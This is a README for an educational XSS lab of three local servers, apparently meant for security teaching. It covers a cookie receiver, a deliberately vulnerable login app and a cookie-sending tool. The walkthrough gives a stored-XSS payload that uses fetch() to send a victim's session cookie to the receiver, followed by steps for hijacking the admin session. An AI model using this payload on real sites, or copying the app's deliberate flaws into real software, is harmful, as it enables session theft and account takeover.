# XSS Security Testing Demo

This project demonstrates XSS (Cross-Site Scripting) vulnerabilities and session hijacking for educational purposes.

## Files

### 1. xss-receiver-node.js (Port 3333)
**XSS Data Receiver / Logger**
- Logs all incoming requests with query parameters
- Displays cookies, referer, user-agent, IP, timestamp
- Auto-refreshes every 5 seconds
- Shows last 50 requests
- Clear logs button
- Uses Estonia/Tallinn timezone

**Usage:**
```bash
bun xss-receiver-node.js
```

**Access:** http://localhost:3333

### 2. cookie-sender.js (Port 3334)
**Cookie Sender Testing Tool**
- Set test cookies with custom names/values
- Clear all cookies
- Send cookies to receiver (port 3333) using 3 methods:
  - Navigation (changes page)
  - Image tag (background request)
  - Fetch API (background request)

**Usage:**
```bash
bun cookie-sender.js
```

**Access:** http://localhost:3334

### 3. vulnerable-demo.js (Port 3335)
**UserHub - Vulnerable Authentication Demo**
- Complete authentication system with login/register
- Session-based authentication (vulnerable - no HttpOnly flag)
- Multiple endpoints: /, /login, /register, /users, /messages, /admin, /logout
- Shared messages board (vulnerable to stored XSS)
- Role-based access control (admin/user)

**Test Accounts:**
- `admin / admin123` (Admin role - can access /admin)
- `john / john123` (User role - cannot access /admin)

**Usage:**
```bash
bun vulnerable-demo.js
```

**Access:** http://localhost:3335

## Getting Started

### Architecture Overview

This demo consists of three independent servers that simulate a real XSS attack scenario:

```
┌─────────────────────┐
│   XSS Receiver      │ ← Attacker's server (logs stolen data)
│   Port 3333         │
└─────────────────────┘
         ↑
         │ Sends stolen cookies/data
         │
┌─────────────────────┐
│   Vulnerable App    │ ← Victim's website (has XSS vulnerability)
│   Port 3335         │
│   (UserHub)         │
└─────────────────────┘
         ↑
         │ Users browse and interact
         │
┌─────────────────────┐
│   Cookie Sender     │ ← Testing tool (simulates XSS attacks)
│   Port 3334         │ → Sends test data to Port 3333
│   (Optional)        │
└─────────────────────┘
```

**Data Flow:**
1. **Port 3335** (Vulnerable App) - Users login and post messages here
2. **XSS Payload** - Malicious JavaScript injected into messages on Port 3335
3. **Stolen Data** - XSS payload sends cookies/data FROM Port 3335 TO Port 3333
4. **Port 3333** (Receiver) - Attacker views stolen data here

### Prerequisites
- Install [Bun](https://bun.sh/) v1.0 or higher
- No other dependencies needed

### Configuration

Each file has a `RECEIVER_URL` configuration at the top that you can easily change:

**For Local Testing:**
```javascript
const RECEIVER_URL = 'http://localhost:3333';
```

**For Remote Server:**
```javascript
const RECEIVER_URL = 'http://your-server.com:3333';
```

**Files to configure:**
- `vulnerable-demo.js` (lines 4-7) - Update XSS payload examples
- `cookie-sender.js` (lines 3-6) - Update default receiver URL
- `xss-receiver-node.js` (lines 3-6) - Update usage examples

### Setup Instructions

#### Step 1: Start the XSS Receiver (Attacker's Server)
**Terminal 1:**
```bash
bun xss-receiver-node.js
```
- Opens on http://localhost:3333
- **Purpose:** Logs all stolen data sent by XSS payloads
- **Receives data FROM:** Port 3335 (when XSS executes)
- Keep this terminal running and monitor incoming requests

#### Step 2: Start the Vulnerable Application (Target Website)
**Terminal 2:**
```bash
bun vulnerable-demo.js
```
- Opens on http://localhost:3335
- **Purpose:** The vulnerable web app where attacks are demonstrated
- **Sends data TO:** Port 3333 (when XSS payload executes)
- This simulates a real website with security flaws

#### Step 3 (Optional): Start Cookie Sender Testing Tool
**Terminal 3:**
```bash
bun cookie-sender.js
```
- Opens on http://localhost:3334
- **Purpose:** Test different cookie exfiltration methods
- **Sends data TO:** Port 3333 (for testing without XSS)
- This is optional - only for testing different attack techniques

### How It Works

1. **Setup Phase:**
   - Port 3333 (Receiver) runs in background waiting for stolen data
   - Port 3335 (Vulnerable App) is where victims browse

2. **Attack Phase:**
   - Attacker posts malicious XSS payload on Port 3335's message board
   - Payload example: `<script>fetch('http://localhost:3333/?stolen='+document.cookie)</script>`

3. **Exploitation Phase:**
   - When victim views the message on Port 3335, the script executes
   - Script sends victim's cookies FROM Port 3335 TO Port 3333
   - Attacker sees stolen data on Port 3333

4. **Result:**
   - Attacker now has victim's session cookie
   - Attacker can impersonate the victim by using stolen cookie

### First Time Usage

1. Start both servers (Port 3333 and 3335)
2. Open http://localhost:3335 in your browser
3. Login with: `admin / admin123` or `john / john123`
4. Go to `/messages` page
5. Post a test message (try normal text first)
6. Open http://localhost:3333 in another tab to see the receiver
7. Follow the "Demo: Stored XSS Attack" section below for full attack simulation

## Demo: Stored XSS Attack

### Step 1: Setup
```bash
# Terminal 1 - Start XSS Receiver
bun xss-receiver-node.js

# Terminal 2 - Start Vulnerable Demo
bun vulnerable-demo.js
```

### Step 2: Attack as Regular User (john)
1. Visit http://localhost:3335/login
2. Login: `john / john123`
3. Go to http://localhost:3335/messages
4. Post this message:
   ```html
   <script>fetch('http://localhost:3333/?stolen='+document.cookie)</script>
   ```

### Step 3: Victim Views Message (admin)
1. Open another browser/incognito window
2. Visit http://localhost:3335/login
3. Login: `admin / admin123`
4. Go to http://localhost:3335/messages
5. **XSS payload executes automatically!**

### Step 4: Steal the Session
1. Check http://localhost:3333
2. See the stolen admin sessionId cookie
3. Copy the sessionId value
4. In a new browser, manually set the cookie:
   ```javascript
   document.cookie = "sessionId=<stolen_value>; path=/"
   ```
5. Visit http://localhost:3335/users - **You're now logged in as admin!**

## Security Vulnerabilities Demonstrated

### Port 3335 (Vulnerable Demo)
1. **No Input Sanitization** - Messages rendered without escaping HTML
2. **No HttpOnly Flag** - sessionId cookie accessible via JavaScript
3. **Stored XSS** - Malicious scripts saved in database and executed for all users
4. **No CSRF Protection** - Forms don't validate request origin
5. **Session Fixation** - No session regeneration after login

### Real-World Mitigation
- ✅ Always sanitize/escape user input before rendering
- ✅ Use HttpOnly flag on session cookies
- ✅ Implement Content Security Policy (CSP)
- ✅ Use CSRF tokens on forms
- ✅ Regenerate session ID after authentication
- ✅ Set SameSite cookie attribute
- ✅ Implement rate limiting

## Requirements

- Bun v1.0+
- No external dependencies (uses built-in http and crypto modules)

## Deployment

To deploy to a remote server:

1. **Configure the URL first:**
   - Edit each `.js` file and change `RECEIVER_URL` at the top
   - Replace `http://example.com:3333` with your actual server URL
   - Example: `const RECEIVER_URL = 'http://your-server.com:3333';`

2. **Deploy files:**
   ```bash
   scp *.js user@server:~/xss-demo/
   ssh user@server
   cd xss-demo
   ```

3. **Start servers:**
   ```bash
   # Start in background
   bun xss-receiver-node.js &
   bun vulnerable-demo.js &

   # Or use screen/tmux for better management
   screen -S receiver
   bun xss-receiver-node.js
   # Press Ctrl+A then D to detach

   screen -S vulnerable
   bun vulnerable-demo.js
   # Press Ctrl+A then D to detach
   ```

4. **Access your deployment:**
   - XSS Receiver: `http://your-server.com:3333`
   - Vulnerable App: `http://your-server.com:3335`

## Notes

⚠️ **FOR EDUCATIONAL PURPOSES ONLY**

This code is intentionally vulnerable and should NEVER be used in production. It demonstrates common security vulnerabilities for learning and testing purposes only.

## License

Educational use only. Use at your own risk.
